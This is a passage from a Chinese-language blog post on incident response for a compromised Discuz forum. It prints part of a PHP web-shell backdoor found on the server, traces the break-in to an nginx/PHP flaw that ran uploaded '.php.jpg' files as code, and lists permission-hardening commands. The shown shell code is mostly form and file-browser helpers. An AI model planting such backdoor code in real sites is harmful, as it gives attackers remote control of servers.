<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'method'</span>] &amp;&amp; $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'method'</span>] = <span style="color: #3e999f;">'post'</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'action'</span>] &amp;&amp; $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'action'</span>] = $<span style="color: #eab700;">self</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'target'</span>] = $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'target'</span>] ? <span style="color: #3e999f;">"target=\"$arg[target]\""</span> : <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'name'</span>] &amp;&amp; $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'name'</span>] = <span style="color: #3e999f;">'form1'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" metho</span><span style="color: #3e999f; text-decoration: underline;">d=\"$arg[method]\" $arg[target]&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>]) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;'</span>.$<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>].<span style="color: #3e999f;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">maketext</span>($<span style="color: #eab700;">arg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>)){
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'cols'</span>] &amp;&amp; $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'cols'</span>] = <span style="color: #4d4d4c; background-color: #ffffff;">100</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'rows'</span>] &amp;&amp; $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'rows'</span>] = <span style="color: #4d4d4c; background-color: #ffffff;">25</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>] = $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>] ? $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>].<span style="color: #3e999f;">'&lt;br /&gt;'</span> : <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name</span><span style="color: #3e999f; text-decoration: underline;">]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">formfooter</span>($<span style="color: #eab700;">name</span> = <span style="color: #3e999f;">''</span>){
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">name</span> &amp;&amp; $<span style="color: #eab700;">name</span> = <span style="color: #3e999f;">'submit'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;&lt;input class="bt" name="'</span>.$<span style="color: #eab700;">name</span>.<span style="color: #3e999f;">'" id="'</span>.$<span style="color: #eab700;">name</span>.<span style="color: #3e999f;">'" type="submit" value=</span><span style="color: #3e999f; text-decoration: underline;">"Submit"&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/form&gt;'</span>);
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">goback</span>(){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">self</span>, $<span style="color: #eab700;">nowpath</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;form action="'</span>.$<span style="color: #eab700;">self</span>.<span style="color: #3e999f;">'" method="post"&gt;&lt;input type="hidden" name="action"</span><span style="color: #3e999f; text-decoration: underline;"> value="file" /&gt;&lt;input type="hidden" name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">formfoot</span>(){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/form&gt;'</span>);
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">encode_pass</span>($<span style="color: #eab700;">pass</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">pass</span> = <span style="color: #4d4d4c; background-color: #ffffff;">md5(</span><span style="color: #3e999f;">'angel'</span>.$<span style="color: #eab700;">pass</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">pass</span> = <span style="color: #4d4d4c; background-color: #ffffff;">md5(</span>$<span style="color: #eab700;">pass</span>.<span style="color: #3e999f;">'angel'</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">pass</span> = <span style="color: #4d4d4c; background-color: #ffffff;">md5(</span><span style="color: #3e999f;">'angel'</span>.$<span style="color: #eab700;">pass</span>.<span style="color: #3e999f;">'angel'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">pass</span>;
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">pr</span>($<span style="color: #eab700;">s</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> <span style="color: #3e999f;">"&lt;pre&gt;"</span>.<span style="color: #4d4d4c; background-color: #ffffff;">print_r(</span>$<span style="color: #eab700;">s</span>).<span style="color: #3e999f;">'&lt;/pre&gt;'</span>;
}

<span style="color: #8959a8;">?&gt;</span>
</pre>
</div>

<p>
上面的脚本被恶意用户完成对系统的远程控制。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">问题根源</h2>
<div class="outline-text-2" id="text-5">
<p>
这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。
</p>

<p>
这个漏洞简言之就是用户可以上传文件后缀为 <code>.php.jpg</code> 的文件，在外部访问时直接被当做 <code>php</code> 执行，罪魁祸首归结为以下三点：
</p>

<ul class="org-ul">
<li><code>php</code> 配置
</li>

<li><code>nginx</code> 配置
</li>

<li><code>discuz</code>

<p>
允许上传文件名指定后缀为 <code>.php.jpg</code>
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">加固措施</h2>
<div class="outline-text-2" id="text-6">
<ul class="org-ul">
<li>采用更严格的文件目录权限

<ul class="org-ul">
<li>列出属主不应该为 <code>nobody</code> 的目录：

<div class="org-src-container">

<pre class="src src-sh">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style="color: #3e999f;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 <code>nobody</code> 用户。
</p>

<p>
需要注意的是 <code>source/plugin/</code> 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：
</p>

<pre class="example">
         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
</pre>
</li>

<li>列出属主不应该为 <code>nobody</code> 的文件：

<div class="org-src-container">

<pre class="src src-sh">find . -type f  | xargs ls -la | grep nobody | grep -v <span style="color: #3e999f;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 <code>nobody</code> 用户。
</p>
</li>

<li>列出 <code>nobody</code> 可写的文件

<div class="org-src-container">

<pre class="src src-sh">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style="color: #3e999f;">'/data/'</span>
</pre>
</div>

<p>
收回非必要的写权限。
</p>
</li>
</ul>
</li>

<li>确保上传目录中的 <code>php</code> 文件不会被当做 <code>php</code> 执行

<ul class="org-ul">
<li>data/attachment
</li>
<li>uc_server/data/avatar
</li>
<li>uc_server/data/tmp
</li>
</ul>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
    </channel>
</rss>